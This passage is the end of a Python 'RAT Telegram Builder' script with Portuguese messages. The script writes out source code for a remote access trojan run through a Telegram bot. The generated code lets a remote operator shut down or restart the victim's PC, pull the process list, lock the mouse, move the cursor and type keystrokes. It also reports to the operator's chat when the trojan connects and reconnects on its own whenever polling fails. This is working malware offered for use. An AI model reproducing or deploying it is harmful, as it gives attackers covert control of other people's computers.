            bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Comando /shutdown
        if self.options["shutdown"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['shutdown'])
def cmd_shutdown(message):
    bot.send_message(message.chat.id, "💤 Desligando PC...")
    os.system("shutdown /s /t 5")
'''
        
        # Comando /restart
        if self.options["restart"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['restart'])
def cmd_restart(message):
    bot.send_message(message.chat.id, "🔄 Reiniciando PC...")
    os.system("shutdown /r /t 5")
'''
        
        # Comando /tasklist
        if self.options["tasklist"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['tasklist'])
def cmd_tasklist(message):
    try:
        result = subprocess.check_output('tasklist', shell=True, text=True)
        if len(result) > 4000:
            result = result[:4000] + "..."
        bot.send_message(message.chat.id, f"📋 Processos:\\n{result}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Comando /block e /unblock
        if self.options["block"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['block'])
def cmd_block(message):
    global mouse_blocked
    mouse_blocked = True
    bot.send_message(message.chat.id, "🖱️ Mouse bloqueado")

@bot.message_handler(commands=['unblock'])
def cmd_unblock(message):
    global mouse_blocked
    mouse_blocked = False
    bot.send_message(message.chat.id, "🖱️ Mouse desbloqueado")

def block_mouse():
    while mouse_blocked:
        pyautogui.moveTo(100, 100)
        time.sleep(0.1)

if mouse_blocked:
    threading.Thread(target=block_mouse, daemon=True).start()
'''
        
        # Comando /mousemove
        if self.options["mousemove"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['mousemove'])
def cmd_mousemove(message):
    try:
        parts = message.text.split()
        if len(parts) >= 3:
            x = int(parts[1])
            y = int(parts[2])
            pyautogui.moveTo(x, y)
            bot.send_message(message.chat.id, f"🖱️ Mouse movido para ({x}, {y})")
        else:
            bot.send_message(message.chat.id, "❌ Use: /mousemove [x] [y]")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Comando /keytype
        if self.options["keytype"]["status"] == "enable":
            code += '''
@bot.message_handler(commands=['keytype'])
def cmd_keytype(message):
    try:
        text = message.text.split('/keytype', 1)[1].strip()
        pyautogui.write(text)
        bot.send_message(message.chat.id, f"✅ Texto digitado: {text}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Erro: {e}")
'''
        
        # Tratamento de erros
        code += '''
@bot.message_handler(func=lambda message: True)
def handle_all(message):
    bot.send_message(message.chat.id, "❓ Comando não reconhecido. Use /help")

# Iniciar bot com tratamento de erro 409
if __name__ == "__main__":
    print("🤖 RAT Telegram iniciado...")
    print("📞 Aguardando comandos...")
    
    # Tentar enviar notificação para chat específico
    if CHAT_ID:
        try:
            bot.send_message(CHAT_ID, "✅ RAT conectado e pronto!")
        except:
            pass
    
    # Loop com tratamento de erro 409
    while True:
        try:
            print("🔄 Iniciando polling...")
            bot.polling(none_stop=True, interval=0, timeout=20)
        except telebot.apihelper.ApiTelegramException as e:
            if "409" in str(e):
                print("⚠️ Conflito de polling detectado. Tentando novamente em 5 segundos...")
                time.sleep(5)
            else:
                print(f"❌ Erro Telegram: {e}")
                time.sleep(5)
        except requests.exceptions.ReadTimeout:
            print("⚠️ Timeout de leitura. Reconectando...")
            time.sleep(2)
        except requests.exceptions.ConnectionError:
            print("⚠️ Erro de conexão. Tentando novamente em 5 segundos...")
            time.sleep(5)
        except Exception as e:
            print(f"❌ Erro geral: {e}")
            time.sleep(5)
'''
        
        return code
    
    def run(self):
        """Executa o builder"""
        self.builder.mainloop()

# ================================
# EXECUÇÃO
# ================================
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════╗
    ║     🐀 RAT TELEGRAM BUILDER v1.4         ║
    ║         by LIMAX DEV                      ║
    ╚══════════════════════════════════════════╝
    """)
    
    builder = RATBuilder()
    builder.run()
